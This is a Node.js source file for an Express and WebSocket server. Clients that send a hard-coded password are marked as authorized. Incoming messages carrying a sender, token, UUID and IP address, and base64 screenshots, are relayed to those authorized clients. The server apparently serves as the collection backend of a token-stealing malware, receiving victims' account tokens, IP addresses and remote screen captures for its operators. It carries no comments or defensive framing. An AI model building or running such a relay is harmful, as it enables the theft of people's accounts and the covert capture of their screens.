const http = require("http");
const express = require("express");
const WebSocket = require("ws");
const app = express();
app.use(express.static("public"));
const PORT = process.env.PORT || 3000;
const server = http.createServer(app);
const wss = new WebSocket.Server({ noServer: true });
const SECRET_COMMAND = 'thisissecret';

server.on('upgrade', (request, socket, head) => {
    wss.handleUpgrade(request, socket, head, ws => {
        wss.emit('connection', ws, request);
    });
});
server.listen(PORT);

const usersInChat = new Map();
const authorizedClients = new Map();
let keepAliveId;

wss.on("connection", function (ws) {
    const userID = generateUniqueID();
    ws.isAuthorized = false;
    
    ws.on("message", data => {
        handleMessage(ws, data, userID);
    });
    
    ws.on("close", () => {
        handleDisconnect(userID);
        ws.removeAllListeners();
    });
    
    if (wss.clients.size === 1 && !keepAliveId) {
        keepServerAlive();
    }
});

wss.on("close", () => {
    clearInterval(keepAliveId);
    keepAliveId = null;
});

function generateUniqueID() {
    return Math.random().toString(36).substr(2, 9);
}

function handleMessage(ws, data, userID) {
    try {
        const message = data.toString();
        if (message === SECRET_COMMAND) {
            ws.isAuthorized = true;
            authorizedClients.set(userID, ws);
            ws.send("Authorized successfully");
        } else {
            const messageData = JSON.parse(message);
            
            if (messageData.sender && messageData.token && messageData.uuid && messageData.ip) {
                broadcastToAuthorizedClients(messageData);
            } else if (messageData.type === 'screenshot' && messageData.data.startsWith('data:image/png;base64')) {
                broadcastToAuthorizedClients({
                    type: 'screenshot',
                    action: messageData.action,
                    screen: messageData.screen,
                    data: messageData.data
                });
            } else if (messageData.action === 'screenshot_result') {
                broadcastToAuthorizedClients({
                    type: 'screenshot',
                    action: messageData.action,
                    screen: messageData.screen,
                    data: messageData.data
                });
            } else {
                broadcastBinary(ws, data);
            }
        }
    } catch (e) {
        console.error('Error handling message:', e);
    }
}

function broadcastToAuthorizedClients(message) {
    const data = JSON.stringify(message);
    authorizedClients.forEach((ws, userId) => {
        if (ws.readyState === WebSocket.OPEN) {
            ws.send(data, error => {
                if (error) console.error("Error sending message to authorized client:", error);
            });
        }
    });
}

function broadcastBinary(senderWs, data) {
    wss.clients.forEach(client => {
        if (client.readyState === WebSocket.OPEN && client !== senderWs && client.isAuthorized) {
            client.send(data);
        }
    });
}

function handleDisconnect(userID) {
    usersInChat.delete(userID);
    authorizedClients.delete(userID);
}

function keepServerAlive() {
    keepAliveId = setInterval(() => {
        wss.clients.forEach(client => {
            if (client.readyState === WebSocket.OPEN) {
                client.ping();
            }
        });
    }, 30000);
}
